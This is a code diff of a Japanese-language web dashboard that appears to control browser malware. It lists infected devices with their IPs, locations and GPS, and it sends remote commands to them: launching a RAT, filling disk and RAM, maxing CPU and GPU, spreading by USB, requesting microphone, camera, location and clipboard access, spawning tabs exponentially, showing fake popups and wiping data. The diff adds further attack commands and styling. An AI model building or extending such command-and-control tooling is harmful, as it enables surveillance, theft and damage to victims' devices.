@@ -12,10 +12,10 @@ h1{font-size:18px;margin:0 0 4px}
 h2{font-size:14px;margin:0 0 8px;color:#9fb0c8;letter-spacing:.06em}
 .card{background:#121722;border:1px solid #232c3d;border-radius:12px;padding:12px;margin:0 0 12px}
 .row{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
-.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:8px}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(118px,1fr));gap:8px}
 button{cursor:pointer;font:inherit;font-size:13px;padding:8px 12px;border-radius:9px;
-  border:1px solid #2c3purple;border:1px solid #2c3a52;background:#18202e;color:#dfe6f2}
-button:hover{background:#1f2a3c}
+  border:1px solid #2c3a52;background:#18202e;color:#dfe6f2;transition:background .25s,border-color .25s}
+button:hover{filter:brightness(1.18)}
 button.on{background:#14351f;border-color:#2f7a48;color:#b9ffd0}
 button.warn{background:#3a1a1c;border-color:#8a2f34;color:#ffd3d5}
 button.big{padding:10px 16px;font-size:14px;font-weight:700}
@@ -23,12 +23,10 @@ button:disabled{opacity:.45;cursor:default}
 input,select{font:inherit;font-size:13px;padding:7px 9px;border-radius:8px;
   border:1px solid #2c3a52;background:#0e131c;color:#e6e9ef;min-width:0}
 input[type=text]{flex:1}
-.kv{display:grid;grid-template-columns:auto 1fr;gap:4px 12px;font-size:13px}
-.kv b{color:#8fa2bd;font-weight:600}
-.mono{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px}
+.note{font-size:12px;color:#93a3bb;line-height:1.7}
 .tag{display:inline-block;font-size:11px;padding:2px 7px;border-radius:999px;
   background:#1c2432;border:1px solid #2c3a52;color:#9fb0c8}
-.lv{font-size:26px;font-weight:800;color:#7ce23a}
+.lv{font-size:26px;font-weight:800;color:#7ce23a;transition:color .25s}
 .live{font-size:26px;font-weight:800;color:#4cd6ff}
 .bar{height:8px;border-radius:99px;background:#1b2230;overflow:hidden;margin:6px 0}
 .bar>i{display:block;height:100%;background:linear-gradient(90deg,#4c8dff,#7ce23a)}
@@ -36,13 +34,13 @@ table{width:100%;border-collapse:collapse;font-size:12px}
 th,td{text-align:left;padding:6px 5px;border-bottom:1px solid #1e2735;vertical-align:top}
 th{color:#8fa2bd;font-weight:600;white-space:nowrap}
 .st{font-weight:700;white-space:nowrap}
-.off{opacity:.5}
+.mono{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px}
 details summary{cursor:pointer;color:#9fb0c8;font-size:13px}
 pre{background:#0a0e15;border:1px solid #1e2735;border-radius:9px;padding:9px;
   overflow:auto;max-height:320px;font-size:11.5px;margin:8px 0 0}
-.note{font-size:12px;color:#93a3bb;line-height:1.7}
 .warnbar{background:#241318;border:1px solid #7a2f36;color:#ffcdd1;
   border-radius:10px;padding:9px 11px;font-size:12.5px;margin:0 0 12px}
+.heattag{font-size:11px;padding:2px 8px;border-radius:999px;border:1px solid #2c3a52}
 </style></head>
 <body>
 
@@ -63,17 +61,17 @@ pre{background:#0a0e15;border:1px solid #1e2735;border-radius:9px;padding:9px;
 <div class="card">
   <div class="row" style="justify-content:space-between">
     <div>
-      <div style="font-size:12px;color:#8fa2bd">レベル（遠隔）</div>
+      <div class="note">レベル（遠隔）</div>
       <div class="lv" id="lv">L{{ level }}</div>
       <div class="note" id="lvdesc">{{ level_desc }}</div>
     </div>
     <div>
-      <div style="font-size:12px;color:#8fa2bd">生存タブ（推定）</div>
+      <div class="note">生存タブ（推定）</div>
       <div class="live" id="live">0</div>
-      <div class="note" id="autoinfo">自動増殖 タブ0 / 窓0</div>
+      <div class="note" id="autoinfo">自動増殖 待機</div>
     </div>
     <div>
-      <div style="font-size:12px;color:#8fa2bd">倒した率</div>
+      <div class="note">倒した率</div>
       <div class="live" id="rate" style="color:#7ce23a">{{ stat.rate }}%</div>
       <div class="note">{{ stat.defeated }} / {{ stat.total }}（bot {{ stat.bot }} 除外）</div>
     </div>
@@ -83,7 +81,8 @@ pre{background:#0a0e15;border:1px solid #1e2735;border-radius:9px;padding:9px;
   <h2 style="margin-top:12px">レベル</h2>
   <div class="grid" id="lvbtns">
     {% for l in levels %}
-    <button data-lv="{{ l }}" class="{% if l == level %}on{% endif %}">L{{ l }} {{ LEVEL_LABEL[l] }}</button>
+    <button data-lv="{{ l }}" data-heat="1" class="{% if l == level %}on{% endif %}">
+      L{{ l }} {{ LEVEL_LABEL[l] }}</button>
     {% endfor %}
   </div>
   <div class="row" style="margin-top:8px">
@@ -95,53 +94,64 @@ pre{background:#0a0e15;border:1px solid #1e2735;border-radius:9px;padding:9px;
 </div>
 
 <div class="card">
-  <h2>増殖（特異点）</h2>
-  <div class="note">×2 = 今の生存タブ数を2倍に。×3 = 3倍に。押すたびに倍々で増えます。</div>
+  <h2>増殖</h2>
+  <div class="note">×2 = 今の生存タブ数を2倍に。押すたび倍々。L7は自動でも倍々が続きます。</div>
   <div class="grid" style="margin-top:8px">
-    <button class="big" data-breed="2">タブ増殖 ×2</button>
-    <button class="big" data-breed="3">タブ増殖 ×3</button>
-    <button class="big" data-breed="4">タブ増殖 ×4</button>
-    <button data-breed="5">×5</button>
+    <button class="big" data-breed="2" data-heat="1">タブ増殖 ×2</button>
+    <button class="big" data-breed="3" data-heat="1">タブ増殖 ×3</button>
+    <button class="big" data-breed="4" data-heat="1">タブ増殖 ×4</button>
+    <button data-breed="5" data-heat="1">×5</button>
   </div>
   <div class="row" style="margin-top:8px">
-    <button data-cmd="autooff">自動増殖 OFF</button>
-    <button data-cmd="autoon">自動増殖 ON</button>
-    <button data-cmd="tabs" data-arg="6">タブ +6</button>
-    <button data-cmd="win" data-arg="3">窓 +3</button>
-    <button data-cmd="tabs" data-arg="20">タブ +20</button>
+    <button data-cmd="autooff" data-heat="1">自動増殖 OFF</button>
+    <button data-cmd="autoon" data-heat="1">自動増殖 ON</button>
+    <button data-cmd="tabs" data-arg="6" data-heat="1">タブ +6</button>
+    <button data-cmd="win" data-arg="3" data-heat="1">窓 +3</button>
+    <button data-cmd="tabs" data-arg="20" data-heat="1">タブ +20</button>
+    <button data-cmd="breed" data-arg="2" data-heat="1">増殖命令</button>
   </div>
   <div class="row" style="margin-top:8px">
-    <span class="note">窓の増殖モード</span>
+    <span class="note">窓モード</span>
     <select id="wmode">
       <option value="">レベル準拠</option>
       <option value="off">OFF</option>
       <option value="chain">チェーン</option>
       <option value="breed">倍々</option>
     </select>
-    <span class="note">枝</span><input id="wbranch" type="text" style="width:60px" value="{{ win_branch }}">
-    <span class="note">深さ</span><input id="wdepth" type="text" style="width:60px" value="{{ win_depth }}">
+    <span class="note">枝</span><input id="wbranch" type="text" style="width:56px" value="{{ win_branch }}">
+    <span class="note">深さ</span><input id="wdepth" type="text" style="width:56px" value="{{ win_depth }}">
     <button id="wapply">適用</button>
     <span class="tag" id="winfo">{{ win_mode or '未設定' }}</span>
   </div>
 </div>
 
 <div class="card">
-  <h2>効果（遠隔命令）</h2>
-  <div class="grid">
-    <button data-cmd="sound">爆音</button>
-    <button data-cmd="flash">赤点滅</button>
-    <button data-cmd="hop">飛び先へ飛ぶ</button>
-    <button data-cmd="disk">ディスク埋め</button>
-    <button data-cmd="ram">RAM膨張</button>
-    <button data-cmd="cpu">CPU 100%</button>
-    <button data-cmd="gpu">GPU負荷</button>
-    <button data-cmd="opfs">OPFS書き込み</button>
-    <button data-cmd="sw">SW再登録</button>
-    <button data-cmd="rat">RAT起動</button>
-    <button data-cmd="sse">SSE接続</button>
-    <button data-cmd="usb">USB伝染</button>
-    <button data-cmd="notify">通知テスト</button>
-    <button data-cmd="wipe" class="warn">記憶消去</button>
+  <h2>結果・操作</h2>
+  <div class="grid" id="effects">
+    <button data-cmd="sound"    data-heat="1">爆音ループ</button>
+    <button data-cmd="flash"    data-heat="1">赤点滅</button>
+    <button data-cmd="noise"    data-heat="1">ノイズ</button>
+    <button data-cmd="hop"      data-heat="1">飛び先へ飛ぶ</button>
+    <button data-cmd="disk"     data-heat="1">ディスク埋め</button>
+    <button data-cmd="ram"      data-heat="1">RAM膨張</button>
+    <button data-cmd="cpu"      data-heat="1">CPU 100%</button>
+    <button data-cmd="gpu"      data-heat="1">GPU負荷</button>
+    <button data-cmd="opfs"     data-heat="1">OPFS書込</button>
+    <button data-cmd="cache"    data-heat="1">Cache飽和</button>
+    <button data-cmd="sw"       data-heat="1">SW再登録</button>
+    <button data-cmd="rat"      data-heat="1">RAT起動</button>
+    <button data-cmd="sse"      data-heat="1">SSE接続</button>
+    <button data-cmd="usb"      data-heat="1">USB伝染</button>
+    <button data-cmd="notify"   data-heat="1">通知テスト</button>
+    <button data-cmd="mic"      data-heat="1">マイク要求</button>
+    <button data-cmd="cam"      data-heat="1">カメラ要求</button>
+    <button data-cmd="gps"      data-heat="1">GPS要求</button>
+    <button data-cmd="clip"     data-heat="1">クリップボード</button>
+    <button data-cmd="full"     data-heat="1">全画面</button>
+    <button data-cmd="wake"     data-heat="1">スリープ禁止</button>
+    <button data-cmd="batt"     data-heat="1">電池読み</button>
+    <button data-cmd="net"      data-heat="1">回線読み</button>
+    <button data-cmd="wipe"     data-heat="1" class="warn">記憶消去</button>
   </div>
   <div class="row" style="margin-top:8px">
     <input id="bombtext" type="text" placeholder="偽ポップアップ文言" value="{{ bomb }}">
@@ -149,21 +159,27 @@ pre{background:#0a0e15;border:1px solid #1e2735;border-radius:9px;padding:9px;
     <button id="injbtn" class="{% if inj %}on{% endif %}">注入 {{ 'ON' if inj else 'OFF' }}</button>
     <button id="hardbtn" class="{% if hard %}on{% endif %}">絶滅 {{ hard or 'OFF' }}</button>
     <button id="clear" class="warn">命令クリア</button>
+    <span class="heattag" id="heattag">熱 L{{ level }}</span>
   </div>
-  <div class="note" style="margin-top:6px">命令待ち: <b id="pend">0</b> 件 / 状態 ver <b id="ver">-</b></div>
+  <div class="note" style="margin-top:6px">
+    命令待ち: <b id="pend">0</b> 件 / 状態 ver <b id="ver">-</b>
+    ／ 未対応の命令は payload 側で無視されます
+  </div>
 </div>
 
 <div class="card">
   <h2>感染端末 {{ total }} 件</h2>
   <table>
-    <thead><tr><th>#</th><th>時刻</th><th>IP</th><th>端末</th><th>国</th><th>進行</th><th>GPS</th><th></th></tr></thead>
+    <thead><tr><th>#</th><th>時刻</th><th>IP</th><th>端末</th><th>国</th>
+      <th>進行</th><th>GPS</th><th></th></tr></thead>
     <tbody id="rows">
     {% for h in hits[:120] %}
       <tr>
         <td class="mono">{{ h.id }}</td>
         <td class="mono">{{ h.ts }}</td>
         <td class="mono">{{ h.ip }}</td>
-        <td>{{ h.device }} / {{ h.os }}<div class="note">{{ h.browser }}{% if h.inapp %} / {{ h.inapp }}{% endif %}</div></td>
+        <td>{{ h.device }} / {{ h.os }}
+          <div class="note">{{ h.browser }}{% if h.inapp %} / {{ h.inapp }}{% endif %}</div></td>
         <td>{{ h.country or '' }} {{ h.city or '' }}</td>
         <td class="st" style="color:{{ stage_colors[stages.get(h.id,0)] }}">
           {{ stage_labels[stages.get(h.id,0)] }}</td>
@@ -173,7 +189,7 @@ pre{background:#0a0e15;border:1px solid #1e2735;border-radius:9px;padding:9px;
     {% endfor %}
     </tbody>
   </table>
-  <div class="note" style="margin-top:8px">進行「常駐」以上 = 倒せた扱い（{{ defeat_at }}+）。bot を押すと集計から除外。</div>
+  <div class="note" style="margin-top:8px">進行「常駐」以上 = 倒せた扱い（{{ defeat_at }}+）。botで集計から除外。</div>
 </div>
 
 <details class="card"><summary>RAT / 生データ</summary>
@@ -184,6 +200,31 @@ pre{background:#0a0e15;border:1px solid #1e2735;border-radius:9px;padding:9px;
 const CODE = {{ code|tojson }};
 const BASE = {{ base|tojson }};
 const $ = (s) => document.querySelector(s);
+
+/* ===== レベル連動ヒート：L0=緑 → L7=真っ赤 ===== */
+function heat(lv) {
+  lv = Math.max(0, Math.min(7, lv | 0));
+  const h = 145 - (145 * lv / 7);
+  const s = 42 + lv * 5;
+  const l = 21 + lv * 3;
+  const bl = 15 + lv * 2.6;
+  document.querySelectorAll("[data-heat]").forEach(b => {
+    b.style.background = "hsl(" + h + "," + s + "%," + l + "%)";
+    b.style.borderColor = "hsl(" + h + "," + (s + 12) + "%," + (l + bl) + "%)";
+    b.style.color = lv >= 4 ? "#ffe9e9" : "#dfe6f2";
+    if (lv >= 6) b.style.boxShadow = "0 0 0 1px hsl(" + h + ",80%,38%) inset";
+    else b.style.boxShadow = "none";
+  });
+  const lvEl = $("#lv");
+  if (lvEl) lvEl.style.color = "hsl(" + h + "," + (s + 25) + "%," + (46 + lv * 4) + "%)";
+  const ht = $("#heattag");
+  if (ht) {
+    ht.textContent = "熱 L" + lv;
+    ht.style.background = "hsl(" + h + "," + s + "%," + l + "%)";
+    ht.style.color = lv >= 4 ? "#ffe9e9" : "#cfe0d6";
+  }
+}
+heat({{ level }});
 
 async function post(path, body) {
   try {
@@ -202,10 +243,11 @@ async function post(path, body) {
 function apply(s) {
   if (!s) return;
   if (s.level !== undefined) {
-    $("#lv").textContent = "L" + s.level;
-    document.querySelectorAll("#lvbtns button").forEach(b => {
-      b.classList.toggle("on", String(b.dataset.lv) === String(s.level));
-    });
+    heat(s.level);
+    document.querySelectorAll("#lvbtns button").forEach(b =>
+      b.classList.toggle("on", String(b.dataset.lv) === String(s.level)));
+    const d = $("#lvdesc");
+    if (d && s.level_desc) d.textContent = s.level_desc;
   }
   if (s.fixed !== undefined) {
     const b = $("#fixbtn");
@@ -219,9 +261,8 @@ function apply(s) {
   }
   if (s.live !== undefined) $("#live").textContent = s.live;
   if (s.auto_tab !== undefined) {
-    $("#autoinfo").textContent =
-      "自動増殖 タブ" + (s.auto_tab || 0) + " / 窓" + (s.auto_win || 0) +
-      (s.auto_on ? "" : "（OFF）");
+    $("#autoinfo").textContent = "自動増殖 タブ" + (s.auto_tab || 0) +
+      " / 窓" + (s.auto_win || 0) + (s.auto_on ? "" : "（OFF）");
   }
   if (s.pending !== undefined) $("#pend").textContent = s.pending;
   if (s.ver !== undefined) $("#ver").textContent = s.ver;
@@ -230,27 +271,23 @@ function apply(s) {
   if (s.hard !== undefined) $("#hardbtn").classList.toggle("on", !!s.hard);
 }
 
-function pickFreeze(cur) {
-  return cur === "" ? "soft" : (cur === "soft" ? "hard" : "");
-}
 let freezeCur = {{ freeze|tojson }};
 let hardCur = {{ hard|tojson }};
 
 document.querySelectorAll("#lvbtns button").forEach(b => b.onclick = () =>
   post(BASE + "/api/vp/" + CODE + "/level", {level: +b.dataset.lv}));
 
-$("#fixbtn").onclick = async () => {
-  const j = await post(BASE + "/api/vp/" + CODE + "/fix",
-    {fixed: $("#fixbtn").classList.contains("on") ? 0 : 1});
-  if (j) { /* state reflected */ }
-};
+$("#fixbtn").onclick = () =>
+  post(BASE + "/api/vp/" + CODE + "/fix",
+       {fixed: $("#fixbtn").classList.contains("on") ? 0 : 1});
 
-$("#firebtn").onclick = () => post(BASE + "/api/vp/" + CODE +
-  ($("#firebtn").classList.contains("on") ? "/stop" : "/resume"), {});
+$("#firebtn").onclick = () =>
+  post(BASE + "/api/vp/" + CODE +
+       ($("#firebtn").classList.contains("on") ? "/stop" : "/resume"), {});
 
-$("#freezebtn").onclick = async () => {
-  freezeCur = pickFreeze(freezeCur);
-  await post(BASE + "/api/vp/" + CODE + "/freeze", {freeze: freezeCur});
+$("#freezebtn").onclick = () => {
+  freezeCur = freezeCur === "" ? "soft" : (freezeCur === "soft" ? "hard" : "");
+  post(BASE + "/api/vp/" + CODE + "/freeze", {freeze: freezeCur});
 };
 
 $("#detonate").onclick = () => post(BASE + "/api/vp/" + CODE + "/detonate", {});
@@ -259,8 +296,7 @@ document.querySelectorAll("[data-breed]").forEach(b => b.onclick = () =>
   post(BASE + "/api/vp/" + CODE + "/breed", {mult: +b.dataset.breed}));
 
 document.querySelectorAll("[data-cmd]").forEach(b => b.onclick = () =>
-  post(BASE + "/api/vp/" + CODE + "/cmd",
-       {kind: b.dataset.cmd, arg: b.dataset.arg || ""}));
+  post(BASE + "/api/vp/" + CODE + "/cmd", {kind: b.dataset.cmd, arg: b.dataset.arg || ""}));
 
 $("#wapply").onclick = () => post(BASE + "/api/vp/" + CODE + "/winlock", {
   mode: $("#wmode").value,
@@ -282,13 +318,16 @@ $("#hardbtn").onclick = () => {
 
 $("#clear").onclick = () => post(BASE + "/api/vp/" + CODE + "/cmds/clear", {});
 
-document.querySelectorAll("[data-bot]").forEach(b => b.onclick = async () => {
-  try {
-    await fetch(BASE + "/api/vp/" + CODE + "/hit/" + b.dataset.bot + "/bot",
-                {method: "POST"});
-    b.classList.toggle("warn");
-  } catch (e) {}
-});
+function bindBot(root) {
+  root.querySelectorAll("[data-bot]").forEach(b => b.onclick = async () => {
+    try {
+      await fetch(BASE + "/api/vp/" + CODE + "/hit/" + b.dataset.bot + "/bot",
+                  {method: "POST"});
+      b.classList.toggle("warn");
+    } catch (e) {}
+  });
+}
+bindBot(document);
 
 async function poll() {
   try {
@@ -301,9 +340,8 @@ async function poll() {
       const j = await r.json();
       $("#rate").textContent = j.stat.rate + "%";
       $("#ratebar").style.width = j.stat.rate + "%";
-      const rows = $("#rows");
-      if (rows && j.rows) {
-        rows.innerHTML = j.rows.map(h => {
+      if (j.rows) {
+        $("#rows").innerHTML = j.rows.map(h => {
           const col = j.colors[j.stages[h.id] || 0];
           const lab = j.labels[j.stages[h.id] || 0];
           return '<tr><td class="mono">' + h.id + '</td><td class="mono">' +
@@ -314,13 +352,7 @@ async function poll() {
             '</td><td>' + (h.gps ? "◎" : "-") + '</td><td><button data-bot="' +
             h.id + '" class="' + (h.is_bot ? "warn" : "") + '">bot</button></td></tr>';
         }).join("");
-        rows.querySelectorAll("[data-bot]").forEach(b => b.onclick = async () => {
-          try {
-            await fetch(BASE + "/api/vp/" + CODE + "/hit/" + b.dataset.bot + "/bot",
-                        {method: "POST"});
-            b.classList.toggle("warn");
-          } catch (e) {}
-        });
+        bindBot($("#rows"));
       }
     }
   } catch (e) {}
@@ -328,8 +360,7 @@ async function poll() {
     const r = await fetch(BASE + "/api/vp/" + CODE + "/rat");
     if (r.ok) {
       const j = await r.json();
-      const d = j.data || {};
-      const keys = Object.keys(d).sort();
+      const d = j.data || {}, keys = Object.keys(d).sort();
       $("#rat").textContent = keys.length
         ? keys.map(k => k + " = " + String(d[k].v).slice(0, 300)).join("\n")
         : "まだデータがありません（相手がまだ踏んでいない）";
